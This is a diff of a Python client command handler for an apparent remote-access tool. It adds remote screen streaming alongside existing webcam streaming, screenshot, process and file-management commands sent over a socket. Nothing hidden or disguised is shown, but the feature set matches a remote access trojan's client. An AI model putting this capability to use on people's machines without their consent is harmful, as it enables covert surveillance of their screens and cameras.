@@ -13,12 +13,13 @@ from utils.network_utils import send_binary_command
 from core.protocol import *
 logger = logging.getLogger("client.command_handler")
 class CommandHandler:
-    def __init__(self, connector, system_manager, process_manager, screenshot_manager, webcam_manager=None, file_manager=None):
+    def __init__(self, connector, system_manager, process_manager, screenshot_manager, webcam_manager=None, screen_stream_manager=None, file_manager=None):
         self.connector = connector
         self.system_manager = system_manager
         self.process_manager = process_manager
         self.screenshot_manager = screenshot_manager
-        self.webcam_manager = webcam_manager  # Novo gerenciador
+        self.webcam_manager = webcam_manager
+        self.screen_stream_manager = screen_stream_manager
         self.file_manager = file_manager
     def process_command(self, cmd_data):
         if len(cmd_data) != 4:
@@ -57,6 +58,10 @@ class CommandHandler:
             self._handle_webcam_stream_start_request()
         elif cmd == CMD_WEBCAM_STREAM_STOP:
             self._handle_webcam_stream_stop_request()
+        elif cmd == CMD_SCREEN_STREAM_START:
+            self._handle_screen_stream_start_request()
+        elif cmd == CMD_SCREEN_STREAM_STOP:
+            self._handle_screen_stream_stop_request()
         else:
             logger.warning(f"Comando desconhecido recebido: {cmd}")
     def _process_legacy_command(self, initial_data):
@@ -600,6 +605,15 @@ class CommandHandler:
         except Exception as e:
             logger.error(f"Erro ao processar criação de diretório: {str(e)}")
             self._send_file_error_response(CMD_FILE_MKDIR_RESPONSE, f"Erro ao criar diretório: {str(e)}")
+    def _send_file_error_response(self, cmd, error_message):
+        try:
+            socket = self.connector.client_socket
+            if socket:
+                error_data = json.dumps({"error": error_message}).encode('utf-8')
+                send_binary_command(socket, cmd, error_data)
+                logger.error(f"Erro enviado: {error_message}")
+        except Exception as e:
+            logger.error(f"Erro ao enviar mensagem de erro: {str(e)}")
     def _handle_webcam_list_request(self):
         logger.info("Webcam list request received")
         try:
@@ -635,7 +649,7 @@ class CommandHandler:
             params_data = socket.recv(data_size)
             params = json.loads(params_data.decode('utf-8'))
             camera_id = params.get('camera_id', 0)
-            quality = params.get('quality', 50)  # Extrair a qualidade configurada
+            quality = params.get('quality', 50)
             threading.Thread(
                 target=self._capture_and_send_webcam,
                 args=(camera_id, quality),
@@ -687,21 +701,21 @@ class CommandHandler:
             params = json.loads(params_data.decode('utf-8'))
             camera_id = params.get('camera_id', 0)
             interval = params.get('interval', 0.1)
-            quality = params.get('quality', 50)  # Extrair configuração de qualidade
+            quality = params.get('quality', 50)
             logger.info(f"Starting streaming from camera {camera_id} at {interval}s intervals with quality {quality}%")
             def stream_callback(image_bytes):
                 try:
                     if self.connector.is_connected:
                         header = json.dumps({
                             "camera_id": camera_id,
-                            "quality": quality,  # Incluir qualidade no header
+                            "quality": quality,
                             "timestamp": time.time()
                         }).encode('utf-8')
                         header_size = struct.pack('>I', len(header))
                         cmd = struct.pack('>I', CMD_WEBCAM_CAPTURE_RESPONSE)
                         img_size = struct.pack('>I', len(image_bytes))
                         self.connector.client_socket.sendall(cmd + header_size + header + img_size + image_bytes)
-                        logger.debug(f"Streamed frame: {len(image_bytes) / 1024:.2f} KB")
+                        logger.debug(f"Streamed webcam frame: {len(image_bytes) / 1024:.2f} KB")
                 except Exception as e:
                     logger.error(f"Streaming callback error: {str(e)}")
                     self.webcam_manager.stop_streaming()
@@ -743,15 +757,79 @@ class CommandHandler:
                 logger.error(f"Webcam error sent: {error_message}")
         except Exception as e:
             logger.error(f"Error sending webcam error message: {str(e)}")
-    def _send_file_error_response(self, cmd, error_message):
+    def _handle_screen_stream_start_request(self):
+        logger.info("Requisição de início de stream de tela recebida")
+        try:
+            if not self.screen_stream_manager:
+                logger.error("Gerenciador de stream de tela não disponível")
+                self._send_screen_stream_error_response(CMD_SCREEN_STREAM_START, "Gerenciador de stream de tela não disponível")
+                return
+            socket = self.connector.client_socket
+            if not socket:
+                logger.error("Socket não disponível")
+                return
+            size_data = socket.recv(4)
+            if not size_data or len(size_data) != 4:
+                logger.error("Erro ao receber tamanho dos parâmetros de stream")
+                return
+            data_size = struct.unpack('>I', size_data)[0]
+            params_data = socket.recv(data_size)
+            params = json.loads(params_data.decode('utf-8'))
+            interval = params.get('interval', 0.1)
+            quality = params.get('quality', 50)
+            logger.info(f"Iniciando streaming de tela com intervalo de {interval}s e qualidade {quality}%")
+            def stream_callback(image_bytes):
+                try:
+                    if self.connector.is_connected:
+                        header = json.dumps({
+                            "quality": quality,
+                            "timestamp": time.time()
+                        }).encode('utf-8')
+                        header_size = struct.pack('>I', len(header))
+                        cmd = struct.pack('>I', CMD_SCREEN_STREAM_FRAME)
+                        img_size = struct.pack('>I', len(image_bytes))
+                        self.connector.client_socket.sendall(cmd + header_size + header + img_size + image_bytes)
+                        logger.debug(f"Frame de tela enviado: {len(image_bytes) / 1024:.2f} KB")
+                except Exception as e:
+                    logger.error(f"Erro no callback de streaming: {str(e)}")
+                    self.screen_stream_manager.stop_streaming()
+            success = self.screen_stream_manager.start_streaming(
+                interval=interval, 
+                callback=stream_callback,
+                quality=quality
+            )
+            response = {"status": "success" if success else "error"}
+            response_json = json.dumps(response).encode('utf-8')
+            send_binary_command(socket, CMD_SCREEN_STREAM_START, response_json)
+        except Exception as e:
+            logger.error(f"Erro ao processar requisição de início de stream de tela: {str(e)}")
+            self._send_screen_stream_error_response(CMD_SCREEN_STREAM_START, str(e))
+    def _handle_screen_stream_stop_request(self):
+        logger.info("Requisição de parada de stream de tela recebida")
+        try:
+            if not self.screen_stream_manager:
+                logger.error("Gerenciador de stream de tela não disponível")
+                self._send_screen_stream_error_response(CMD_SCREEN_STREAM_STOP, "Gerenciador de stream de tela não disponível")
+                return
+            self.screen_stream_manager.stop_streaming()
+            socket = self.connector.client_socket
+            if socket:
+                response = {"status": "success"}
+                response_json = json.dumps(response).encode('utf-8')
+                send_binary_command(socket, CMD_SCREEN_STREAM_STOP, response_json)
+                logger.info("Stream de tela parado com sucesso")
+        except Exception as e:
+            logger.error(f"Erro ao processar requisição de parada de stream de tela: {str(e)}")
+            self._send_screen_stream_error_response(CMD_SCREEN_STREAM_STOP, str(e))
+    def _send_screen_stream_error_response(self, cmd, error_message):
         try:
             socket = self.connector.client_socket
             if socket:
                 error_data = json.dumps({"error": error_message}).encode('utf-8')
                 send_binary_command(socket, cmd, error_data)
-                logger.error(f"Erro enviado: {error_message}")
+                logger.error(f"Erro de stream de tela enviado: {error_message}")
         except Exception as e:
-            logger.error(f"Erro ao enviar mensagem de erro: {str(e)}")
+            logger.error(f"Erro ao enviar mensagem de erro de stream de tela: {str(e)}")
     def _recv_exact(self, size, timeout=30):
         original_timeout = self.connector.client_socket.gettimeout()
         try:
